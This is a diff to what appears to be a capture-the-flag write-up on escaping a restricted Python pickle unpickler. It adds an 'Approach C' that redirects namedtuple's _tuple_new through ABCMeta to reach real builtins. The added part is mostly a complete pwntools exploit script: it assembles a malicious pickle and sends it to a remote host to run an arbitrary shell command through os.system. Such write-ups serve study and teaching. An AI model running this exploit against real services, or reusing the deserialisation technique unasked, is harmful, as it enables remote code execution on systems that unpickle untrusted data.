@@ -55,7 +55,7 @@ __new__ = eval(code, namespace)                      # (F)
 
 To inject a malicious payload into `eval`, we must bypass checks at (B) and (C) while still having the payload end up in `arg_list` at (E). Both approaches below override function names in `collections` globals via the `__getattr__` mechanism to achieve this. The namespace at (F) has `__builtins__: {}`, so the payload must obtain real builtins through other means.
 
-## Approach A: UserDict.__radd__
+## Approach A: UserDict.__radd__ (organizers)
 
 **How it works:**
 
@@ -115,7 +115,7 @@ r.sendline((pickle.PROTO + b'\x04' + p).hex().encode())
 print(r.recvall(timeout=3).decode(errors='replace'))
 ```
 
-## Approach B: UserString manipulation
+## Approach B: UserString manipulation (splitline)
 
 **How it works:**
 
@@ -271,5 +271,98 @@ def build_exploit():
 
 r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
 r.sendline(build_exploit().hex().encode())
+print(r.recvall(timeout=3).decode(errors='replace'))
+```
+
+## Approach C: ABCMeta + `_tuple_new` redirection (maple3142)
+
+**How it works:**
+
+The key insight: when `namedtuple` executes `_tuple_new = tuple.__new__`, `tuple` is looked up from `collections.__dict__`. If `collections.tuple` has been replaced with a custom class `XC` (via `__getattr__`), then `_tuple_new` becomes `XC.__new__` — which is set to `_check_methods`, a Python function with `__globals__`. The eval code can then access `_tuple_new.__globals__["__builtins__"]` to get real builtins.
+
+1. Set `_collections_abc.__all__` to include `"_type_repr"`, `"_check_methods"`, `"ABCMeta"`, `"tuple"`. Get `_check_methods` and `ABCMeta` via `__getattr__`.
+2. Create `XC = ABCMeta("XC", (), {"__new__": _check_methods})` — a class whose `__new__` is `_check_methods`.
+3. Set `_collections_abc.NotImplemented = [payload]` — so `_check_methods` returns the payload list when method check fails.
+4. Set `_collections_abc.tuple = XC` — injected into `collections` globals via `__getattr__`.
+5. Call `namedtuple('x', [])`. Inside namedtuple, `tuple(...)` resolves to `XC(...)`, calling `_check_methods` which returns the payload list. The payload ends up in `arg_list`. The `#` in the payload comments out the rest, leaving clean code: ``lambda _cls, a: 1, `_tuple_new.__globals__["__builtins__"]...system("cmd")` `` — a tuple whose second element executes the command.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+import pickle, struct
+
+context.log_level = 'error'
+HOST = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
+PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 48763
+CMD = sys.argv[3] if len(sys.argv) > 3 else 'id'
+
+P = pickle
+
+class PickleBuilder:
+    def __init__(self):
+        self.p = P.PROTO + b'\x04'; self.memos = {}; self.next_memo = 0
+    def short_binunicode(self, s):
+        data = s.encode('utf-8'); assert len(data) < 256
+        return P.SHORT_BINUNICODE + bytes([len(data)]) + data
+    def stack_global(self, m, n):
+        return self.short_binunicode(m) + self.short_binunicode(n) + P.STACK_GLOBAL
+    def memoize(self):
+        idx = self.next_memo; self.next_memo += 1
+        return P.MEMOIZE, idx
+    def binget(self, idx):
+        return P.BINGET + bytes([idx]) if idx < 256 else P.LONG_BINGET + struct.pack('<I', idx)
+    def emit_global(self, m, n, save_as=None):
+        b = self.stack_global(m, n)
+        if save_as is not None:
+            mb, idx = self.memoize(); b += mb; self.memos[save_as] = idx
+        self.p += b
+    def get_memo(self, k): return self.binget(self.memos[k])
+    def build_slotstate(self, obj, key_val_pairs):
+        b = obj + P.EMPTY_DICT + P.MARK
+        for k, v in key_val_pairs:
+            b += k + v
+        b += P.DICT + P.TUPLE2 + P.BUILD
+        return b
+    def emit_build_slotstate(self, obj, kvs): self.p += self.build_slotstate(obj, kvs)
+    def mark(self): return P.MARK
+    def list_op(self): return P.LIST
+    def tuple_op(self): return P.TUPLE
+    def reduce(self): return P.REDUCE
+    def none(self): return P.NONE
+    def stop(self): return P.STOP
+    def setitem(self): return P.SETITEM
+
+pb = PickleBuilder()
+pb.emit_global('collections', 'namedtuple', save_as='namedtuple')
+pb.emit_global('collections', '_collections_abc', save_as='abc')
+pb.emit_build_slotstate(pb.get_memo('abc'),
+    [(pb.short_binunicode('__all__'),
+      pb.mark() + (pb.short_binunicode('_type_repr') + pb.short_binunicode('_check_methods')
+                   + pb.short_binunicode('ABCMeta') + pb.short_binunicode('tuple'))
+      + pb.list_op())])
+for name in ['_check_methods', 'ABCMeta']:
+    pb.emit_global('collections', name, save_as=name)
+
+# XC = ABCMeta("XC", (), {"__new__": _check_methods})
+pb.p += pb.get_memo('ABCMeta') + pb.mark()
+pb.p += pb.short_binunicode('XC') + P.EMPTY_TUPLE + P.EMPTY_DICT
+pb.p += pb.short_binunicode('__new__') + pb.get_memo('_check_methods')
+pb.p += pb.setitem() + pb.tuple_op() + pb.reduce() + pb.memoize()[0]
+xc_idx = pb.next_memo - 1
+
+payload = f'a: 1,_tuple_new.__globals__["__builtins__"]["__import__"]("os").system("{CMD}")#'
+pb.emit_build_slotstate(pb.get_memo('abc'),
+    [(pb.short_binunicode('NotImplemented'),
+      pb.mark() + pb.short_binunicode(payload) + pb.list_op())])
+pb.emit_build_slotstate(pb.get_memo('abc'),
+    [(pb.short_binunicode('tuple'), pb.binget(xc_idx))])
+
+pb.p += pb.stack_global('collections', 'tuple') + P.POP
+pb.p += pb.get_memo('namedtuple') + pb.mark()
+pb.p += pb.short_binunicode('x') + P.EMPTY_TUPLE
+pb.p += pb.tuple_op() + pb.reduce() + pb.none() + pb.stop()
+
+r = remote(HOST, PORT); r.recvuntil(b'(hex)> ')
+r.sendline(pb.p.hex().encode())
 print(r.recvall(timeout=3).decode(errors='replace'))
 ```
